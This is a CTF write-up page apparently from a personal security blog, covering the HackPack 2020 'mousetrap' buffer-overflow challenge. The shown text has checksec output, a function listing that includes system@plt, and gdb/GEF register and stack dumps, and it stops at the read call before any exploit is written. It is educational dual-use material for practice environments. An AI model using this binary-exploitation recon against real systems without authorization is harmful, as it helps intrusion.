<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
<title>HackPack CTF: Pwn Challenge | gr4n173</title>
<meta name="generator" content="Jekyll v3.8.6" />
<meta property="og:title" content="HackPack CTF: Pwn Challenge" />
<meta name="author" content="gr4n173>" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="I will explain about the pwn challenges that I solved in during CTF." />
<meta property="og:description" content="I will explain about the pwn challenges that I solved in during CTF." />
<link rel="canonical" href="http://localhost:4000/2020/05/01/hackpack-ctf-pwn.html" />
<meta property="og:url" content="http://localhost:4000/2020/05/01/hackpack-ctf-pwn.html" />
<meta property="og:site_name" content="gr4n173" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-05-01T00:00:00+05:45" />
<script type="application/ld+json">
{"@type":"BlogPosting","url":"http://localhost:4000/2020/05/01/hackpack-ctf-pwn.html","headline":"HackPack CTF: Pwn Challenge","dateModified":"2020-05-01T00:00:00+05:45","datePublished":"2020-05-01T00:00:00+05:45","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/05/01/hackpack-ctf-pwn.html"},"author":{"@type":"Person","name":"gr4n173>"},"description":"I will explain about the pwn challenges that I solved in during CTF.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/public/images/blackflag.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="gr4n173" /></head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">gr4n173<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/"><i class="fab fa-twitter"></i></a><a class="color-red-hover" href="https://gr4n173.github.io"><i class="fab fa-itch-io"></i></a><a class="color-purple-hover" href="https://github.com/gr4n173"><i class="fab fa-github"></i></a><a class="color-blue-hover" href="https://www.facebook.com/profile.php?id=100038644863435"><i class="fab fa-facebook"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/680705408297730058"><i class="fab fa-discord"></i></a><a class="color-red-hover" href="mailto:me.gr4n173@protonmail.com"><i class="fab fa-mailchimp"></i></a><a class="color-cyan-hover" href="https://www.hackthebox.eu/home/users/profile/60443"><i class="fab fa-itch-io"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">

<img src="https://gravatar.com/avatar/6691d16a4bf77dcf1f54ee766349682a?s=256" class="author-avatar" />

Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.

</div>

<div class="post">
  <h1 class="post-title">HackPack CTF: Pwn Challenge</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/ctf/">ctf</a>
      
      <a class="tag" href="/tag/hackpackctf/">hackpackctf</a>
      
      <a class="tag" href="/tag/pwn/">pwn</a>
      
      <a class="tag" href="/tag/BoF/">BoF</a>
      
      <a class="tag" href="/tag/Explotation&Pwning/">Explotation&Pwning</a>
      
  </div>
  
  <div class="post-date">Published on 01 May 2020</div>
  
  <div class="post-description"> I will explain about the pwn challenges that I solved in during CTF.</div>
  
  <h1 id="hackpack-ctf">HackPack CTF</h1>

<p>HackPack CTF is a security competition that is part of the two security courses at NCSU: CSC-405 Computer Security and CSC-591 Systems Attacks and Defenses. The target audience is people interested in computer security that have some related background (like took a security course before ;) and want to exercise their skills in a secure environment by solving security challenges.
For more detail you can visit <a href="https://hackpack.club/ctf2020">here</a>.</p>

<p>I will talk about the challenges that I solved during live of ctf.</p>

<h2 id="pwn-challenges">Pwn Challenges</h2>

<h3 id="mousetrap">mousetrap</h3>
<h4 id="description232">Description[232]</h4>
<p>Are you savvy enough to steal a piece of cheese?</p>

<p><code class="highlighter-rouge">nc cha.hackpack.club 41719</code></p>

<h4 id="file-mousetrap">File: <a href="/public/files/ctf/mousetrap">mousetrap</a></h4>

<p><strong>Solution:-</strong> As I run the challenge I was asked to enter the name randomly and then code Sequence but got the output with <code class="highlighter-rouge">SNAAAAAAAP! you died!%</code>. Now I grabbed my gdb and analyze the ELF file.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gr4n173</span><span class="o">@</span><span class="nx">root</span><span class="o">:~</span><span class="c1"># gdb -q mousetrap</span>
<span class="nx">GEF</span> <span class="k">for</span> <span class="nx">linux</span> <span class="nx">ready</span><span class="p">,</span> <span class="nx">type</span> <span class="sb">`gef' to start, `</span><span class="nx">gef</span> <span class="nx">config</span><span class="s1">' to configure
78 commands loaded for GDB 9.1 using Python engine 3.8
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from mousetrap...
(No debugging symbols found in mousetrap)
gef➤ checksec mousetrap
[*] '</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">gr4n173</span><span class="o">/</span><span class="nx">pwn</span><span class="o">/</span><span class="nx">mousetrapfile</span><span class="o">/</span><span class="nx">mousetrap</span><span class="err">'</span>
    <span class="nx">Arch</span><span class="o">:</span>     <span class="nx">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="nx">little</span>
    <span class="nx">RELRO</span><span class="o">:</span>    <span class="nx">Partial</span> <span class="nx">RELRO</span>
    <span class="nx">Stack</span><span class="o">:</span>    <span class="nx">No</span> <span class="nx">canary</span> <span class="nx">found</span>
    <span class="nx">NX</span><span class="o">:</span>       <span class="nx">NX</span> <span class="nx">enabled</span>
    <span class="nx">PIE</span><span class="o">:</span>      <span class="nx">No</span> <span class="nx">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
</code></pre></div></div>

<p>From this output, RELRO(partial) indicate lazy binding was possible and NX(non-executable) enabled I was unable inject shellcode but Stack <code class="highlighter-rouge">No canary found</code> indicated there was buffer overflow.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gef</span><span class="err">➤</span>  <span class="nx">info</span> <span class="nx">functions</span>
<span class="nx">All</span> <span class="nb">defined</span> <span class="nx">functions</span><span class="o">:</span>
<span class="nx">Non</span><span class="o">-</span><span class="nx">debugging</span> <span class="nx">symbols</span><span class="o">:</span>
<span class="mh">0x00000000004005a0</span>  <span class="nx">_init</span>
<span class="mh">0x00000000004005d0</span>  <span class="nx">strcpy</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x00000000004005e0</span>  <span class="nx">puts</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x00000000004005f0</span>  <span class="nb">system</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400600</span>  <span class="nb">printf</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400610</span>  <span class="nx">read</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400620</span>  <span class="nx">setvbuf</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400630</span>  <span class="nx">_start</span>
<span class="mh">0x0000000000400660</span>  <span class="nx">_dl_relocate_static_pie</span>
<span class="mh">0x0000000000400670</span>  <span class="nx">deregister_tm_clones</span>
<span class="mh">0x00000000004006a0</span>  <span class="nx">register_tm_clones</span>
<span class="mh">0x00000000004006e0</span>  <span class="nx">__do_global_dtors_aux</span>
<span class="mh">0x0000000000400710</span>  <span class="nx">frame_dummy</span>
<span class="mh">0x0000000000400717</span>  <span class="nx">cheeeeeeeese</span>
<span class="mh">0x000000000040072a</span>  <span class="nx">init</span>
<span class="mh">0x000000000040078b</span>  <span class="nx">set_mouse_name</span>
<span class="mh">0x00000000004007c1</span>  <span class="nx">grab_cheese</span>
<span class="mh">0x00000000004007e3</span>  <span class="nx">deactivate_trap</span>
<span class="mh">0x0000000000400823</span>  <span class="nx">menu</span>
<span class="mh">0x0000000000400842</span>  <span class="nb">main</span>
<span class="mh">0x00000000004008c0</span>  <span class="nx">__libc_csu_init</span>
<span class="mh">0x0000000000400930</span>  <span class="nx">__libc_csu_fini</span>
<span class="mh">0x0000000000400934</span>  <span class="nx">_fini</span>
<span class="nx">gef</span><span class="err">➤</span>
</code></pre></div></div>
<p>Then I break a point in <code class="highlighter-rouge">set_mouse_name</code> function and the I run it.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gef</span><span class="err">➤</span>  <span class="k">break</span> <span class="nx">set_mouse_name</span>
<span class="nx">Breakpoint</span> <span class="mi">1</span> <span class="nx">at</span> <span class="mh">0x40078f</span>
<span class="nx">gef</span><span class="err">➤</span>  <span class="nx">run</span>
<span class="nx">Starting</span> <span class="nx">program</span><span class="o">:</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">bikram</span><span class="o">/</span><span class="nx">mystuff</span><span class="o">/</span><span class="nx">onlinectf</span><span class="o">/</span><span class="nx">hackpack</span><span class="o">/</span><span class="nx">pwn</span><span class="o">/</span><span class="nx">mousetrapfile</span><span class="o">/</span><span class="nx">mousetrap</span> 
<span class="nx">Welcome</span> <span class="nx">little</span> <span class="nx">mouse</span>
<span class="nx">can</span> <span class="nx">you</span> <span class="nx">steal</span> <span class="nx">the</span> <span class="nx">cheese</span> <span class="nx">from</span> <span class="nx">the</span> <span class="nx">mouse</span> <span class="nx">trap</span>

<span class="nx">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x000000000040078f</span> <span class="nx">in</span> <span class="nx">set_mouse_name</span> <span class="p">()</span>
<span class="p">[</span> <span class="nx">Legend</span><span class="o">:</span> <span class="nx">Modified</span> <span class="nx">register</span> <span class="o">|</span> <span class="nx">Code</span> <span class="o">|</span> <span class="nx">Heap</span> <span class="o">|</span> <span class="nx">Stack</span> <span class="o">|</span> <span class="nx">String</span> <span class="p">]</span>
<span class="p">[</span> <span class="nx">Legend</span><span class="o">:</span> <span class="nx">Modified</span> <span class="nx">register</span> <span class="o">|</span> <span class="nx">Code</span> <span class="o">|</span> <span class="nx">Heap</span> <span class="o">|</span> <span class="nx">Stack</span> <span class="o">|</span> <span class="nx">String</span> <span class="p">]</span>
<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">registers</span> <span class="err">────</span>
<span class="nv">$rax</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdc90</span>  <span class="err">→</span>  <span class="mh">0x00000000004008c0</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">__libc_csu_init</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="nx">push</span> <span class="nx">r15</span>
<span class="nv">$rbx</span>   <span class="o">:</span> <span class="mh">0x0</span>               
<span class="nv">$rcx</span>   <span class="o">:</span> <span class="mh">0x00007ffff7ece643</span>  <span class="err">→</span>  <span class="mh">0x5577fffff0003d48</span> <span class="p">(</span><span class="s2">"H="</span><span class="o">?</span><span class="p">)</span>
<span class="nv">$rdx</span>   <span class="o">:</span> <span class="mh">0x0</span>               
<span class="nv">$rsp</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdb70</span>  <span class="err">→</span>  <span class="mh">0x00007fffffffdcb0</span>  <span class="err">→</span>  <span class="mh">0x00000000004008c0</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">__libc_csu_init</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="nx">push</span> <span class="nx">r15</span>
<span class="nv">$rbp</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdb70</span>  <span class="err">→</span>  <span class="mh">0x00007fffffffdcb0</span>  <span class="err">→</span>  <span class="mh">0x00000000004008c0</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">__libc_csu_init</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="nx">push</span> <span class="nx">r15</span>
<span class="nv">$rsi</span>   <span class="o">:</span> <span class="mh">0x00007ffff7f9d723</span>  <span class="err">→</span>  <span class="mh">0xf9f4c0000000000a</span>
<span class="nv">$rdi</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdc90</span>  <span class="err">→</span>  <span class="mh">0x00000000004008c0</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">__libc_csu_init</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="nx">push</span> <span class="nx">r15</span>
<span class="nv">$rip</span>   <span class="o">:</span> <span class="mh">0x000000000040078f</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">set_mouse_name</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span> <span class="nx">sub</span> <span class="nx">rsp</span><span class="p">,</span> <span class="mh">0x10</span>
<span class="nv">$r8</span>    <span class="o">:</span> <span class="mh">0x2d</span>              
<span class="nv">$r9</span>    <span class="o">:</span> <span class="mh">0x00007ffff7fe3530</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">_dl_fini</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="nx">push</span> <span class="nx">rbp</span>
<span class="nv">$r10</span>   <span class="o">:</span> <span class="mh">0x00007ffff7fef7c0</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nb">strcmp</span><span class="o">+</span><span class="mi">2544</span><span class="o">&gt;</span> <span class="nx">pxor</span> <span class="nx">xmm0</span><span class="p">,</span> <span class="nx">xmm0</span>
<span class="nv">$r11</span>   <span class="o">:</span> <span class="mh">0x246</span>             
<span class="nv">$r12</span>   <span class="o">:</span> <span class="mh">0x0000000000400630</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">_start</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="k">xor</span> <span class="nx">ebp</span><span class="p">,</span> <span class="nx">ebp</span>
<span class="nv">$r13</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdd90</span>  <span class="err">→</span>  <span class="mh">0x0000000000000001</span>
<span class="nv">$r14</span>   <span class="o">:</span> <span class="mh">0x0</span>               
<span class="nv">$r15</span>   <span class="o">:</span> <span class="mh">0x0</span>               
<span class="nv">$eflags</span><span class="o">:</span> <span class="p">[</span><span class="nx">ZERO</span> <span class="nx">carry</span> <span class="nx">PARITY</span> <span class="nx">adjust</span> <span class="nx">sign</span> <span class="nx">trap</span> <span class="nx">INTERRUPT</span> <span class="nx">direction</span> <span class="nx">overflow</span> <span class="nx">resume</span> <span class="nx">virtualx86</span> <span class="nx">identification</span><span class="p">]</span>
<span class="nv">$cs</span><span class="o">:</span> <span class="mh">0x0033</span> <span class="nv">$ss</span><span class="o">:</span> <span class="mh">0x002b</span> <span class="nv">$ds</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="nv">$es</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="nv">$fs</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="nv">$gs</span><span class="o">:</span> <span class="mh">0x0000</span> 
<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">stack</span> <span class="err">────</span>
<span class="mh">0x00007fffffffdb70</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0000</span><span class="o">:</span> <span class="mh">0x00007fffffffdcb0</span>  <span class="err">→</span>  <span class="mh">0x00000000004008c0</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">__libc_csu_init</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="nx">push</span> <span class="nx">r15</span>	 <span class="err">←</span> <span class="nv">$rsp</span><span class="p">,</span> <span class="nv">$rbp</span>
<span class="mh">0x00007fffffffdb78</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0008</span><span class="o">:</span> <span class="mh">0x000000000040087d</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nb">main</span><span class="o">+</span><span class="mi">59</span><span class="o">&gt;</span> <span class="nx">mov</span> <span class="nx">rdx</span><span class="p">,</span> <span class="nx">QWORD</span> <span class="nx">PTR</span> <span class="p">[</span><span class="nx">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">]</span>
<span class="mh">0x00007fffffffdb80</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0010</span><span class="o">:</span> <span class="mh">0x00007fffffffdd98</span>  <span class="err">→</span>  <span class="mh">0x00007fffffffe120</span>  <span class="err">→</span>  <span class="s2">"/home/bikram/mystuff/onlinectf/hackpack/pwn/mouset[...]"</span>
<span class="mh">0x00007fffffffdb88</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0018</span><span class="o">:</span> <span class="mh">0x00000001ffffdcd0</span>
<span class="mh">0x00007fffffffdb90</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0020</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>
<span class="mh">0x00007fffffffdb98</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0028</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>
<span class="mh">0x00007fffffffdba0</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0030</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>
<span class="mh">0x00007fffffffdba8</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0038</span><span class="o">:</span> <span class="mh">0x00007ffff7ffe730</span>  <span class="err">→</span>  <span class="mh">0x00007ffff7fd2000</span>  <span class="err">→</span>  <span class="mh">0x00010102464c457f</span>
<span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">code</span><span class="o">:</span><span class="nx">x86</span><span class="o">:</span><span class="mi">64</span> <span class="err">────</span>
     <span class="mh">0x400786</span> <span class="o">&lt;</span><span class="nx">init</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span>        <span class="p">(</span><span class="nx">bad</span><span class="p">)</span>  
     <span class="mh">0x400787</span> <span class="o">&lt;</span><span class="nx">init</span><span class="o">+</span><span class="mi">93</span><span class="o">&gt;</span>        <span class="nx">call</span>   <span class="nx">QWORD</span> <span class="nx">PTR</span> <span class="p">[</span><span class="nx">rax</span><span class="o">+</span><span class="mh">0x4855c35d</span><span class="p">]</span>
     <span class="mh">0x40078d</span> <span class="o">&lt;</span><span class="nx">set_mouse_name</span><span class="o">+</span><span class="mi">2</span><span class="o">&gt;</span> <span class="nx">mov</span>    <span class="nx">ebp</span><span class="p">,</span> <span class="nx">esp</span>
 <span class="err">→</span>   <span class="mh">0x40078f</span> <span class="o">&lt;</span><span class="nx">set_mouse_name</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span> <span class="nx">sub</span>    <span class="nx">rsp</span><span class="p">,</span> <span class="mh">0x10</span>
     <span class="mh">0x400793</span> <span class="o">&lt;</span><span class="nx">set_mouse_name</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span> <span class="nx">mov</span>    <span class="nx">QWORD</span> <span class="nx">PTR</span> <span class="p">[</span><span class="nx">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">],</span> <span class="nx">rdi</span>
     <span class="mh">0x400797</span> <span class="o">&lt;</span><span class="nx">set_mouse_name</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span> <span class="nx">lea</span>    <span class="nx">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nx">rip</span><span class="o">+</span><span class="mh">0x1b2</span><span class="p">]</span>        <span class="c1"># 0x400950</span>
     <span class="mh">0x40079e</span> <span class="o">&lt;</span><span class="nx">set_mouse_name</span><span class="o">+</span><span class="mi">19</span><span class="o">&gt;</span> <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span> <span class="mh">0x0</span>
     <span class="mh">0x4007a3</span> <span class="o">&lt;</span><span class="nx">set_mouse_name</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span> <span class="nx">call</span>   <span class="mh">0x400600</span> <span class="o">&lt;</span><span class="nb">printf</span><span class="o">@</span><span class="nx">plt</span><span class="o">&gt;</span>
     <span class="mh">0x4007a8</span> <span class="o">&lt;</span><span class="nx">set_mouse_name</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;</span> <span class="nx">mov</span>    <span class="nx">rax</span><span class="p">,</span> <span class="nx">QWORD</span> <span class="nx">PTR</span> <span class="p">[</span><span class="nx">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">]</span>
<span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">threads</span> <span class="err">────</span>
<span class="p">[</span><span class="c1">#0] Id 1, Name: "mousetrap", stopped 0x40078f in set_mouse_name (), reason: BREAKPOINT</span>
<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">trace</span> <span class="err">────</span>
<span class="p">[</span><span class="c1">#0] 0x40078f → set_mouse_name()</span>
<span class="p">[</span><span class="c1">#1] 0x40087d → main()</span>
</code></pre></div></div>
<p>Then I run <code class="highlighter-rouge">ni</code> till I reached to <code class="highlighter-rouge">read</code> where my value was stored.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gef</span><span class="err">➤</span>  <span class="nx">ni</span>
<span class="mh">0x00000000004007b9</span> <span class="nx">in</span> <span class="nx">set_mouse_name</span> <span class="p">()</span>
<span class="p">[</span> <span class="nx">Legend</span><span class="o">:</span> <span class="nx">Modified</span> <span class="nx">register</span> <span class="o">|</span> <span class="nx">Code</span> <span class="o">|</span> <span class="nx">Heap</span> <span class="o">|</span> <span class="nx">Stack</span> <span class="o">|</span> <span class="nx">String</span> <span class="p">]</span>
<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">registers</span> <span class="err">────</span>
<span class="nv">$rax</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdc90</span>  <span class="err">→</span>  <span class="mh">0x00000000004008c0</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">__libc_csu_init</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="nx">push</span> <span class="nx">r15</span>
<span class="nv">$rbx</span>   <span class="o">:</span> <span class="mh">0x0</span>               
<span class="nv">$rcx</span>   <span class="o">:</span> <span class="mh">0x0</span>               
<span class="nv">$rdx</span>   <span class="o">:</span> <span class="mh">0x20</span>              
<span class="nv">$rsp</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdb60</span>  <span class="err">→</span>  <span class="mh">0x0000000000000000</span>
<span class="nv">$rbp</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdb70</span>  <span class="err">→</span>  <span class="mh">0x00007fffffffdcb0</span>  <span class="err">→</span>  <span class="mh">0x00000000004008c0</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">__libc_csu_init</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="nx">push</span> <span class="nx">r15</span>
<span class="nv">$rsi</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdc90</span>  <span class="err">→</span>  <span class="mh">0x00000000004008c0</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">__libc_csu_init</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="nx">push</span> <span class="nx">r15</span>
<span class="nv">$rdi</span>   <span class="o">:</span> <span class="mh">0x0</span>               
<span class="nv">$rip</span>   <span class="o">:</span> <span class="mh">0x00000000004007b9</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">set_mouse_name</span><span class="o">+</span><span class="mi">46</span><span class="o">&gt;</span> <span class="nx">call</span> <span class="mh">0x400610</span> <span class="o">&lt;</span><span class="nx">read</span><span class="o">@</span><span class="nx">plt</span><span class="o">&gt;</span>
<span class="nv">$r8</span>    <span class="o">:</span> <span class="mh">0x2d</span>              
<span class="nv">$r9</span>    <span class="o">:</span> <span class="mh">0x6</span>               
<span class="nv">$r10</span>   <span class="o">:</span> <span class="mh">0x0000000000400950</span>  <span class="err">→</span>  <span class="mh">0x4500203a656d614e</span> <span class="p">(</span><span class="s2">"Name: "</span><span class="o">?</span><span class="p">)</span>
<span class="nv">$r11</span>   <span class="o">:</span> <span class="mh">0x246</span>             
<span class="nv">$r12</span>   <span class="o">:</span> <span class="mh">0x0000000000400630</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">_start</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="k">xor</span> <span class="nx">ebp</span><span class="p">,</span> <span class="nx">ebp</span>
<span class="nv">$r13</span>   <span class="o">:</span> <span class="mh">0x00007fffffffdd90</span>  <span class="err">→</span>  <span class="mh">0x0000000000000001</span>
<span class="nv">$r14</span>   <span class="o">:</span> <span class="mh">0x0</span>               
<span class="nv">$r15</span>   <span class="o">:</span> <span class="mh">0x0</span>               
<span class="nv">$eflags</span><span class="o">:</span> <span class="p">[</span><span class="nx">zero</span> <span class="nx">carry</span> <span class="nx">parity</span> <span class="nx">adjust</span> <span class="nx">sign</span> <span class="nx">trap</span> <span class="nx">INTERRUPT</span> <span class="nx">direction</span> <span class="nx">overflow</span> <span class="nx">resume</span> <span class="nx">virtualx86</span> <span class="nx">identification</span><span class="p">]</span>
<span class="nv">$cs</span><span class="o">:</span> <span class="mh">0x0033</span> <span class="nv">$ss</span><span class="o">:</span> <span class="mh">0x002b</span> <span class="nv">$ds</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="nv">$es</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="nv">$fs</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="nv">$gs</span><span class="o">:</span> <span class="mh">0x0000</span> 
<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">stack</span> <span class="err">────</span>
<span class="mh">0x00007fffffffdb60</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0000</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>	 <span class="err">←</span> <span class="nv">$rsp</span>
<span class="mh">0x00007fffffffdb68</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0008</span><span class="o">:</span> <span class="mh">0x00007fffffffdc90</span>  <span class="err">→</span>  <span class="mh">0x00000000004008c0</span>  <span class="err">→</span>  <span class="sb">`__libc_csu_init+0`</span> <span class="nx">push</span> <span class="nx">r15</span>
<span class="mh">0x00007fffffffdb70</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0010</span><span class="o">:</span> <span class="mh">0x00007fffffffdcb0</span>  <span class="err">→</span>  <span class="mh">0x00000000004008c0</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nx">__libc_csu_init</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="nx">push</span> <span class="nx">r15</span>	 <span class="err">←</span> <span class="nv">$rbp</span>
<span class="mh">0x00007fffffffdb78</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0018</span><span class="o">:</span> <span class="mh">0x000000000040087d</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="nb">main</span><span class="o">+</span><span class="mi">59</span><span class="o">&gt;</span> <span class="nx">mov</span> <span class="nx">rdx</span><span class="p">,</span> <span class="nx">QWORD</span> <span class="nx">PTR</span> <span class="p">[</span><span class="nx">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">]</span>
<span class="mh">0x00007fffffffdb80</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0020</span><span class="o">:</span> <span class="mh">0x00007fffffffdd98</span>  <span class="err">→</span>  <span class="mh">0x00007fffffffe120</span>  <span class="err">→</span>  <span class="s2">"/home/bikram/mystuff/onlinectf/hackpack/pwn/mouset[...]"</span>
<span class="mh">0x00007fffffffdb88</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0028</span><span class="o">:</span> <span class="mh">0x00000001ffffdcd0</span>
<span class="mh">0x00007fffffffdb90</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0030</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>
<span class="mh">0x00007fffffffdb98</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0038</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>
<span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nx">code</span><span class="o">:</span><span class="nx">x86</span><span class="o">:</span><span class="mi">64</span> <span class="err">────</span>
     <span class="mh">0x4007ac</span> <span class="o">&lt;</span><span class="nx">set_mouse_name</span><span class="o">+</span><span class="mi">33</span><span class="o">&gt;</span> <span class="nx">mov</span>    <span class="nx">edx</span><span class="p">,</span> <span class="mh">0x20</span>
     <span class="mh">0x4007b1</span> <span class="o">&lt;</span><span class="nx">set_mouse_name</span><span class="o">+</span><span class="mi">38</span><span class="o">&gt;</span> <span class="nx">mov</span>    <span class="nx">rsi</span><span class="p">,</span> <span class="nx">rax</span>
     <span class="mh">0x4007b4</span> <span class="o">&lt;</span><span class="nx">set_mouse_name</span><span class="o">+</span><span class="mi">41</span><span class="o">&gt;</span> <span class="nx">mov</span>    <span class="nx">edi</span><span class="p">,</span> <span class="mh">0x0</span>
 <span class="err">→</span>   <span class="mh">0x4007b9</span> <span class="o">&lt;</span><span class="nx">set_mouse_name</span><span class="o">+</span><span class="mi">46</span><span class="o">&gt;</span> <span class="nx">call</span>   <span class="mh">0x400610</span> <span class="o">&lt;</span><span class="nx">read</span><span class="o">@</span><span class="nx">plt</span><span class="o">&gt;</span>
